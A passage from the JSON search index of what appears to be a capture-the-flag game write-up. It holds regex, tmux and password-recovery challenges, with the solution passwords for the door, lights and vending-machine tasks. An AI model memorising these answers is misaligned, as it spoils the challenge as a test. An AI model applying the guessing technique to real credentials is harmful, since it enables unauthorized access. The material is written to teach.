hour:minute:second time formats only"},{"location":"terminal/sort/#7-matches-mac-address-format-only-while-ignoring-case","text":"\\b([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})\\b","title":"7) Matches MAC address format only while ignoring case"},{"location":"terminal/sort/#8-matches-multiple-day-month-and-year-date-formats-only","text":"\\b[0-3]\\d[/ . -][0-1]\\d[/ . -]\\d{4}\\b Once you complete the challenge you get the following message:","title":"8) Matches multiple day, month, and year date formats only"},{"location":"terminal/tmux/","text":"Terminal - Kringle Kiosk \u00b6 Terminal \u00b6 Elf: Pepper Minstix Location: Front Lawn Related to Objective: 4 The goal of this terminal challenge is to teach you about Tmux. The hint for this terminal challenge is available in the hint section. Reviewing the Tmux cheat list shows you that you can attach to a disconnected session with the command tmux a . Answer \u00b6 Here are the answers to this terminal challenge tmux a","title":"Unescape Tmux"},{"location":"terminal/tmux/#terminal-kringle-kiosk","text":"","title":"Terminal - Kringle Kiosk"},{"location":"terminal/tmux/#terminal","text":"Elf: Pepper Minstix Location: Front Lawn Related to Objective: 4 The goal of this terminal challenge is to teach you about Tmux. The hint for this terminal challenge is available in the hint section. Reviewing the Tmux cheat list shows you that you can attach to a disconnected session with the command tmux a .","title":"Terminal"},{"location":"terminal/tmux/#answer","text":"Here are the answers to this terminal challenge tmux a","title":"Answer"},{"location":"terminal/unprep/","text":"Terminal - Speaker UNPrep \u00b6 Terminal \u00b6 Elf: Bushy Evergreen Location: Talks level Related to Objective: 5 The goal of this terminal challenge is to teach you about using strings and password decryption. The hint for this terminal challenge is available in the hint section. Here are the instructions for this challenge: door \u00b6 Use strings to get the password for ./door . Type the password in. lights \u00b6 The password for lights is stored in lights.conf . If you copy the password to the name field in the conf file, the program will decrypt the password and show it in the username file. vending-machines \u00b6 The password for this challenge is stored in vending-machine.json . In the lab, you can delete this config file and the program will ask you to create a new username/password. You can start with \"AAAA\" to see if anything looks similar to the encrypted password in the .json file LVEdQPpBwr . Once you figure the first character of the password you proceed to the second character (ex. \"CAAAA\" if the first character was C). You will find the password is \"CandyCane1\". Answer \u00b6 Here are the answers to this terminal challenge: door: Op3nTheD00r lights: Computer-TurnLightsOn vending-machines: CandyCane1","title":"Speaker UNPrep"},{"location":"terminal/unprep/#terminal-speaker-unprep","text":"","title":"Terminal - Speaker UNPrep"},{"location":"terminal/unprep/#terminal","text":"Elf: Bushy Evergreen Location: Talks level Related to Objective: 5 The goal of this terminal challenge is to teach you about using strings and password decryption. The hint for this terminal challenge is available in the hint section. Here are the instructions for this challenge:","title":"Terminal"},{"location":"terminal/unprep/#door","text":"Use strings to get the password for ./door . Type the password in.","title":"door"},{"location":"terminal/unprep/#lights","text":"The password for lights is stored in lights.conf . If you copy the password to the name field in the conf file, the program will decrypt the password and show it in the username file.","title":"lights"},{"location":"terminal/unprep/#vending-machines","text":"The password for this challenge is stored in vending-machine.json . In the lab, you can delete this config file and the program will ask you to create a new username/password. You can start with \"AAAA\" to see if anything looks similar to the encrypted password in the .json file LVEdQPpBwr . Once you figure the first character of the password you proceed to the second character (ex. \"CAAAA\" if the first character was C). You will find the password is \"CandyCane1\".","title":"vending-machines"},{"location":"terminal/unprep/#answer","text":"Here are the answers to this terminal challenge: door: Op3nTheD00r lights: Computer-TurnLightsOn vending-machines: CandyCane1","title":"Answer"}]}